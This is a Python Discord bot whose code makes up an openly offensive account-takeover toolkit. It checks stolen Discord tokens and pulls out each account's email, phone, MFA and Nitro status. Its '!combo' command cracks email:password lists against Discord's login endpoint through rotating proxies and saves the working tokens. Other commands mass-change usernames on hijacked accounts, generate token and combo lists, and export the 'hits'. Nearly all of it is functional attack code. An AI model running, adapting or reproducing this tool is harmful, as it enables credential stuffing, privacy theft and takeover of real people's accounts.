import discord
from discord.ext import commands
import aiohttp
import asyncio
import os
import io
import random
import string
from datetime import datetime

# ── ENV ──────────────────────────────────────────────────────────────────────
BOT_TOKEN      = os.environ["BOT_TOKEN"]
LOG_CHANNEL_ID = int(os.environ.get("LOG_CHANNEL_ID", 0))

# ── STATE ────────────────────────────────────────────────────────────────────
proxy_list:     list[str] = []
valid_hits:     list[str] = []
combo_hits:     list[str] = []
dropped_tokens: list[str] = []

# ── DISCORD ──────────────────────────────────────────────────────────────────
intents = discord.Intents.default()
intents.message_content = True
bot = commands.Bot(command_prefix="!", intents=intents)

# ── HEADERS ──────────────────────────────────────────────────────────────────
BASE_HEADERS = {
    "Content-Type": "application/json",
    "User-Agent": (
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
        "AppleWebKit/537.36 (KHTML, like Gecko) "
        "Chrome/120.0.0.0 Safari/537.36"
    ),
    "X-Super-Properties": (
        "eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiQ2hyb21lIiwiZGV2aWNlIjoiIiwic3lzdGVtX"
        "2xvY2FsZSI6ImVuLVVTIiwiYnJvd3Nlcl91c2VyX2FnZW50IjoiTW96aWxsYS81LjAgKFdpbm"
        "Rvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IiwiYnJvd3Nlcl"
        "92ZXJzaW9uIjoiMTIwLjAuMC4wIiwib3NfdmVyc2lvbiI6IjEwIiwicmVmZXJyZXIiOiIiLCJ"
        "yZWZlcnJpbmdfZG9tYWluIjoiIiwicmVmZXJyZXJfY3VycmVudCI6IiIsInJlZmVycmluZ19k"
        "b21haW5fY3VycmVudCI6IiIsInJlbGVhc2VfY2hhbm5lbCI6InN0YWJsZSIsImNsaWVudF9i"
        "dWlsZF9udW1iZXIiOjI3MjgzMiwiY2xpZW50X2V2ZW50X3NvdXJjZSI6bnVsbH0="
    ),
    "X-Discord-Locale": "en-US",
}

NITRO_MAP = {0: "❌ None", 1: "⚡ Nitro Classic", 2: "💎 Nitro", 3: "🔹 Nitro Basic"}

# ── HELPERS ───────────────────────────────────────────────────────────────────
def get_proxy() -> str | None:
    return random.choice(proxy_list) if proxy_list else None

def rstr(n: int) -> str:
    return "".join(random.choices(string.ascii_lowercase + string.digits, k=n))

def snowflake_to_time(uid: str) -> str:
    try:
        ts = (int(uid) >> 22) + 1420070400000
        return datetime.utcfromtimestamp(ts / 1000).strftime("%Y-%m-%d")
    except Exception:
        return "Unknown"

def status_color(s: str) -> int:
    return {
        "valid_full":     0x57F287,
        "valid_no_phone": 0xFEE75C,
        "verify_email":   0xED4245,
        "locked":         0xEB459E,
        "invalid":        0x2F3136,
        "timeout":        0x5865F2,
        "ratelimited":    0xFFA500,
        "dropped":        0xFF73FA,
        "generated":      0x00B0F4,
    }.get(s, 0x747F8D)

def status_label(s: str) -> str:
    return {
        "valid_full":     "✅ Valid — Full Access",
        "valid_no_phone": "⚠️ Valid — No Phone",
        "verify_email":   "📧 Needs Email Verification",
        "locked":         "🔒 Locked / Disabled",
        "invalid":        "❌ Invalid",
        "timeout":        "⏱️ Timeout",
        "ratelimited":    "🚦 Rate Limited",
        "dropped":        "💀 Dropped",
        "generated":      "🎲 Generated",
    }.get(s, f"❓ {s}")

def parse_line(line: str) -> tuple[str, str] | None:
    for sep in [":", "|", ";"]:
        if sep in line:
            p = line.strip().split(sep, 1)
            if len(p) == 2 and p[0] and p[1]:
                return p[0].strip(), p[1].strip()
    return None

# ── CORE: TOKEN CHECK ─────────────────────────────────────────────────────────
async def _check_token(session: aiohttp.ClientSession, token: str) -> dict:
    hdrs  = {**BASE_HEADERS, "Authorization": token}
    proxy = get_proxy()
    pkw   = {"proxy": f"http://{proxy}"} if proxy else {}
    tout  = aiohttp.ClientTimeout(total=12)
    res   = {
        "token": token, "status": "invalid",
        "username": None, "email": None, "phone": None,
        "mfa": False, "nitro_type": "❌ None",
        "verified": False, "locale": "N/A",
        "created_at": "Unknown", "id": None,
    }

    try:
        async with session.get(
            "https://discord.com/api/v9/users/@me",
            headers=hdrs, timeout=tout, **pkw
        ) as r:
            if r.status == 401:
                return res
            if r.status == 403:
                res["status"] = "locked"; return res
            if r.status == 429:
                wait = int(r.headers.get("Retry-After", 5))
                await asyncio.sleep(wait)
                res["status"] = "ratelimited"; return res
            if r.status != 200:
                res["status"] = "error"; return res
            data = await r.json()

        async with session.get(
            "https://discord.com/api/v9/users/@me/billing/subscriptions",
            headers=hdrs, timeout=tout, **pkw
        ) as br:
            billing = await br.json() if br.status == 200 else []

        uid      = data.get("id", "")
        verified = data.get("verified", False)
        phone    = data.get("phone")
        ptype    = data.get("premium_type", 0)
        if billing and not ptype:
            ptype = 1

        res.update({
            "id":         uid,
            "username":   f"{data.get('username')}#{data.get('discriminator','0')}",
            "email":      data.get("email", "N/A"),
            "phone":      phone or "None",
            "mfa":        data.get("mfa_enabled", False),
            "verified":   verified,
            "locale":     data.get("locale", "N/A"),
            "nitro_type": NITRO_MAP.get(ptype, "❌ None"),
            "created_at": snowflake_to_time(uid),
            "status": (
                "verify_email"   if not verified else
                "valid_no_phone" if not phone    else
                "valid_full"
            ),
        })

    except asyncio.TimeoutError:
        res["status"] = "timeout"
    except Exception:
        res["status"] = "error"

    return res

# ── CORE: COMBO CHECK ─────────────────────────────────────────────────────────
async def _check_combo(session: aiohttp.ClientSession, email: str, password: str) -> dict:
    proxy = get_proxy()
    pkw   = {"proxy": f"http://{proxy}"} if proxy else {}
    tout  = aiohttp.ClientTimeout(total=15)
    res   = {"email": email, "password": password, "token": None, "status": "invalid"}

    payload = {
        "login": email,
        "password": password,
        "undelete": False,
        "login_source": None,
        "gift_code_sku_id": None,
    }

    try:
        async with session.post(
            "https://discord.com/api/v9/auth/login",
            headers=BASE_HEADERS,
            json=payload,
            timeout=tout,
            **pkw,
        ) as r:
            data = await r.json()

            if r.status == 200:
                token = data.get("token")
                if token:
                    res["token"] = token
                    res["status"] = "valid"
                elif data.get("mfa"):
                    res["status"] = "mfa_required"
                    res["ticket"] = data.get("ticket")
                return res

            if r.status == 400:
                res["status"] = "captcha" if "captcha_key" in data else "invalid"
                return res

            if r.status == 429:
                res["status"] = "ratelimited"
                return res

            res["status"] = f"http_{r.status}"

    except asyncio.TimeoutError:
        res["status"] = "timeout"
    except Exception:
        res["status"] = "error"

    return res

# ── CORE: USERNAME DROPPER ────────────────────────────────────────────────────
async def _drop_username(session: aiohttp.ClientSession, token: str, username: str) -> dict:
    hdrs = {**BASE_HEADERS, "Authorization": token}
    tout = aiohttp.ClientTimeout(total=10)
    res  = {"token": token, "username": username, "status": "failed", "new_username": None}

    async with session.get(
        "https://discord.com/api/v9/users/@me",
        headers=hdrs, timeout=tout
    ) as r:
        if r.status != 200:
            res["status"] = "auth_failed"
            return res

    async with session.patch(
        "https://discord.com/api/v9/users/@me",
        headers=hdrs,
        json={"username": username},
        timeout=tout,
    ) as r:
        data = await r.json()
        if r.status == 200:
            res["status"] = "dropped"
            res["new_username"] = data.get("username")
        elif r.status == 429:
            res["status"] = "ratelimited"
        elif "username" in str(data):
            res["status"] = "taken"
        else:
            res["status"] = f"failed_{r.status}"

    return res

# ── CORE: TOKEN GENERATOR ─────────────────────────────────────────────────────
def _generate_tokens(count: int) -> list[str]:
    tokens = []
    for _ in range(count):
        uid_part  = "".join(random.choices(string.ascii_letters + string.digits, k=random.randint(24, 26)))
        time_part = "".join(random.choices(string.ascii_letters + string.digits + "_-", k=6))
        hmac_part = "".join(random.choices(string.ascii_letters + string.digits + "_-", k=38))
        tokens.append(f"{uid_part}.{time_part}.{hmac_part}")
    return tokens

# ── EMBED BUILDERS ────────────────────────────────────────────────────────────
def token_embed(res: dict, idx: int, total: int) -> discord.Embed:
    e = discord.Embed(title=f"Token Result [{idx}/{total}]", color=status_color(res["status"]))
    e.add_field(name="Status", value=status_label(res["status"]), inline=False)
    if res.get("username"):
        e.add_field(name="👤 Username",  value=res["username"],                  inline=True)
        e.add_field(name="📧 Email",     value=res["email"],                     inline=True)
        e.add_field(name="📱 Phone",     value=res["phone"],                     inline=True)
        e.add_field(name="🔐 MFA",       value="✅" if res["mfa"] else "❌",     inline=True)
        e.add_field(name="💎 Nitro",     value=res["nitro_type"],                inline=True)
        e.add_field(name="✅ Verified",  value="✅" if res["verified"] else "❌", inline=True)
        e.add_field(name="🌍 Locale",    value=res["locale"],                    inline=True)
        e.add_field(name="📅 Created",   value=res["created_at"],                inline=True)
    e.set_footer(text=f"Token: {res['token'][:30]}...")
    e.timestamp = datetime.utcnow()
    return e

def combo_embed(res: dict, idx: int, total: int) -> discord.Embed:
    s = "valid_full" if res["status"] == "valid" else res["status"]
    e = discord.Embed(title=f"Combo Result [{idx}/{total}]", color=status_color(s))
    e.add_field(name="Status",      value=status_label(res["status"]) if res["status"] in ("invalid","timeout","ratelimited") else f"✅ {res['status'].upper()}", inline=False)
    e.add_field(name="📧 Email",    value=res["email"],                inline=True)
    e.add_field(name="🔑 Password", value=f"||{res['password']}||",   inline=True)
    if res.get("token"):
        e.add_field(name="🎫 Token", value=f"```{res['token'][:60]}...```", inline=False)
    e.timestamp = datetime.utcnow()
    return e

def drop_embed(res: dict) -> discord.Embed:
    color = status_color("dropped") if res["status"] == "dropped" else status_color("invalid")
    e = discord.Embed(title="Username Drop Result", color=color)
    e.add_field(name="Status",    value=status_label("dropped") if res["status"] == "dropped" else f"❌ {res['status']}", inline=False)
    e.add_field(name="🎯 Target", value=res["username"], inline=True)
    if res.get("new_username"):
        e.add_field(name="✅ Claimed", value=res["new_username"], inline=True)
    e.set_footer(text=f"Token: {res['token'][:25]}...")
    e.timestamp = datetime.utcnow()
    return e

def summary_embed(stats: dict, mode: str) -> discord.Embed:
    e = discord.Embed(title=f"📊 {mode} — Summary", color=0x5865F2)
    for k, v in stats.items():
        e.add_field(name=k, value=str(v), inline=True)
    e.timestamp = datetime.utcnow()
    return e

# ── EVENTS ────────────────────────────────────────────────────────────────────
@bot.event
async def on_ready():
    print(f"[+] {bot.user} online")
    await bot.change_presence(
        activity=discord.Activity(type=discord.ActivityType.watching, name="tokens | !help")
    )

# ── COMMANDS ──────────────────────────────────────────────────────────────────
@bot.command(name="help")
async def help_cmd(ctx):
    e = discord.Embed(title="🛠️ Tool Commands", color=0x5865F2)
    e.add_field(name="🔍 Checker",   value="`!check` — tokens (file or inline)\n`!combo` — email:pass file", inline=False)
    e.add_field(name="🎲 Generator", value="`!gen <n>` — token strings\n`!gencombo <n>` — email:pass combos", inline=False)
    e.add_field(name="💀 Dropper",   value="`!drop <token> <name>`\n`!massdrop <name>` — tokens from file", inline=False)
    e.add_field(name="🌐 Proxies",   value="`!addproxy` — file\n`!proxycount`\n`!clearproxy`", inline=False)
    e.add_field(name="📁 Export",    value="`!export hits`\n`!export combohits`\n`!export dropped`", inline=False)
    e.add_field(name="📈 Stats",     value="`!stats`", inline=False)
    await ctx.send(embed=e)

@bot.command(name="check")
@commands.has_permissions(administrator=True)
async def check_cmd(ctx, *args):
    tokens = []
    if ctx.message.attachments:
        for a in ctx.message.attachments:
            if a.filename.endswith(".txt"):
                raw = await a.read()
                tokens += [l.strip() for l in raw.decode().splitlines() if l.strip()]
    tokens += list(args)
    tokens = list(dict.fromkeys(tokens))
    if not tokens:
        await ctx.send("❌ No tokens. Attach `.txt` or pass inline."); return

    total  = len(tokens)
    log_ch = bot.get_channel(LOG_CHANNEL_ID) or ctx.channel
    msg    = await ctx.send(f"⏳ Checking **{total}** token(s)…")
    stats  = {"✅ Valid Full": 0, "⚠️ No Phone": 0, "📧 Verify": 0, "🔒 Locked": 0, "❌ Invalid": 0, "⏱️ Timeout": 0}

    async with aiohttp.ClientSession() as session:
        for i, token in enumerate(tokens, 1):
            res = await _check_token(session, token)
            if res["status"] == "valid_full":
                stats["✅ Valid Full"] += 1; valid_hits.append(token)
            elif res["status"] == "valid_no_phone":
                stats["⚠️ No Phone"] += 1; valid_hits.append(token)
            elif res["status"] == "verify_email": stats["📧 Verify"] += 1
            elif res["status"] == "locked":       stats["🔒 Locked"] += 1
            elif res["status"] == "timeout":      stats["⏱️ Timeout"] += 1
            else:                                 stats["❌ Invalid"] += 1
            await log_ch.send(embed=token_embed(res, i, total))
            await asyncio.sleep(1.0)

    await ctx.send(embed=summary_embed(stats, "Token Checker"))
    await msg.delete()

@bot.command(name="combo")
@commands.has_permissions(administrator=True)
async def combo_cmd(ctx):
    pairs = []
    if ctx.message.attachments:
        for a in ctx.message.attachments:
            if a.filename.endswith(".txt"):
                raw = await a.read()
                for line in raw.decode().splitlines():
                    p = parse_line(line)
                    if p: pairs.append(p)
    if not pairs:
        await ctx.send("❌ Attach a `.txt` with `email:pass` per line."); return

    total  = len(pairs)
    log_ch = bot.get_channel(LOG_CHANNEL_ID) or ctx.channel
    msg    = await ctx.send(f"⏳ Cracking **{total}** combo(s)…")
    stats  = {"✅ Valid": 0, "🔐 MFA": 0, "🤖 Captcha": 0, "❌ Invalid": 0, "🚦 Ratelimited": 0}

    async with aiohttp.ClientSession() as session:
        for i, (email, password) in enumerate(pairs, 1):
            res = await _check_combo(session, email, password)
            if res["status"] == "valid":
                stats["✅ Valid"] += 1
                combo_hits.append(f"{email}:{password}:{res['token']}")
            elif res["status"] == "mfa_required": stats["🔐 MFA"] += 1
            elif res["status"] == "captcha":      stats["🤖 Captcha"] += 1
            elif res["status"] == "ratelimited":
                stats["🚦 Ratelimited"] += 1
                await asyncio.sleep(5)
            else: stats["❌ Invalid"] += 1
            await log_ch.send(embed=combo_embed(res, i, total))
            await asyncio.sleep(1.5)

    await ctx.send(embed=summary_embed(stats, "Combo Cracker"))
    await msg.delete()

@bot.command(name="gen")
@commands.has_permissions(administrator=True)
async def gen_cmd(ctx, amount: int = 100):
    amount = min(amount, 10000)
    tokens = _generate_tokens(amount)
    buf = io.BytesIO("\n".join(tokens).encode())
    buf.seek(0)
    await ctx.send(
        embed=discord.Embed(title=f"🎲 Generated {amount} Tokens", description="Use `!check` to validate.", color=0x00B0F4),
        file=discord.File(buf, filename=f"generated_{amount}.txt")
    )

@bot.command(name="gencombo")
@commands.has_permissions(administrator=True)
async def gencombo_cmd(ctx, amount: int = 100):
    amount  = min(amount, 10000)
    domains = ["gmail.com","yahoo.com","hotmail.com","outlook.com","icloud.com","proton.me"]
    lines   = [f"{rstr(random.randint(5,12))}@{random.choice(domains)}:{rstr(random.randint(8,16))}" for _ in range(amount)]
    buf = io.BytesIO("\n".join(lines).encode())
    buf.seek(0)
    await ctx.send(
        embed=discord.Embed(title=f"🎲 Generated {amount} Combos", description="Use `!combo` to crack.", color=0x00B0F4),
        file=discord.File(buf, filename=f"combos_{amount}.txt")
    )

@bot.command(name="drop")
@commands.has_permissions(administrator=True)
async def drop_cmd(ctx, token: str, username: str):
    async with aiohttp.ClientSession() as session:
        res = await _drop_username(session, token, username)
    if res["status"] == "dropped":
        dropped_tokens.append(f"{token}:{username}")
    await ctx.send(embed=drop_embed(res))

@bot.command(name="massdrop")
@commands.has_permissions(administrator=True)
async def massdrop_cmd(ctx, username: str):
    tokens = []
    if ctx.message.attachments:
        for a in ctx.message.attachments:
            if a.filename.endswith(".txt"):
                raw = await a.read()
                tokens += [l.strip() for l in raw.decode().splitlines() if l.strip()]
    if not tokens:
        await ctx.send("❌ Attach `.txt` of tokens."); return

    log_ch = bot.get_channel(LOG_CHANNEL_ID) or ctx.channel
    msg    = await ctx.send(f"💀 Dropping `{username}` on **{len(tokens)}** accounts…")
    stats  = {"💀 Dropped": 0, "🚫 Taken": 0, "❌ Failed": 0}

    async with aiohttp.ClientSession() as session:
        for token in tokens:
            res = await _drop_username(session, token, username)
            if res["status"] == "dropped":
                stats["💀 Dropped"] += 1
                dropped_tokens.append(f"{token}:{res.get('new_username', username)}")
            elif res["status"] == "taken": stats["🚫 Taken"] += 1
            else:                          stats["❌ Failed"] += 1
            await log_ch.send(embed=drop_embed(res))
            await asyncio.sleep(1.2)

    await ctx.send(embed=summary_embed(stats, "Mass Dropper"))
    await msg.delete()

@bot.command(name="addproxy")
@commands.has_permissions(administrator=True)
async def addproxy_cmd(ctx):
    if not ctx.message.attachments:
        await ctx.send("❌ Attach a `.txt` of proxies."); return
    added = 0
    for a in ctx.message.attachments:
        if a.filename.endswith(".txt"):
            raw = await a.read()
            for line in raw.decode().splitlines():
                p = line.strip()
                if p: proxy_list.append(p); added += 1
    await ctx.send(f"✅ Added **{added}** proxies. Total: **{len(proxy_list)}**")

@bot.command(name="proxycount")
async def proxycount_cmd(ctx):
    await ctx.send(f"🌐 **{len(proxy_list)}** proxies loaded.")

@bot.command(name="clearproxy")
@commands.has_permissions(administrator=True)
async def clearproxy_cmd(ctx):
    proxy_list.clear()
    await ctx.send("✅ Proxy list cleared.")

@bot.command(name="export")
@commands.has_permissions(administrator=True)
async def export_cmd(ctx, kind: str = "hits"):
    data_map = {
        "hits":      (valid_hits,     "valid_hits.txt"),
        "combohits": (combo_hits,     "combo_hits.txt"),
        "dropped":   (dropped_tokens, "dropped.txt"),
    }
    if kind not in data_map:
        await ctx.send(f"❌ Use: {', '.join(data_map.keys())}"); return
    lst, fname = data_map[kind]
    if not lst:
        await ctx.send(f"📭 No data in `{kind}` yet."); return
    buf = io.BytesIO("\n".join(lst).encode())
    buf.seek(0)
    await ctx.send(f"📁 Exporting **{len(lst)}** entries:", file=discord.File(buf, filename=fname))

@bot.command(name="stats")
async def stats_cmd(ctx):
    e = discord.Embed(title="📈 Session Stats", color=0x5865F2)
    e.add_field(name="✅ Valid Hits",  value=str(len(valid_hits)),     inline=True)
    e.add_field(name="🔑 Combo Hits", value=str(len(combo_hits)),     inline=True)
    e.add_field(name="💀 Dropped",    value=str(len(dropped_tokens)), inline=True)
    e.add_field(name="🌐 Proxies",    value=str(len(proxy_list)),     inline=True)
    e.timestamp = datetime.utcnow()
    await ctx.send(embed=e)

@bot.event
async def on_command_error(ctx, error):
    if isinstance(error, commands.MissingPermissions):
        await ctx.send("❌ Admins only.")
    elif isinstance(error, commands.MissingRequiredArgument):
        await ctx.send(f"❌ Missing argument: `{error.param.name}`")
    elif isinstance(error, commands.BadArgument):
        await ctx.send("❌ Bad argument.")

bot.run(BOT_TOKEN)
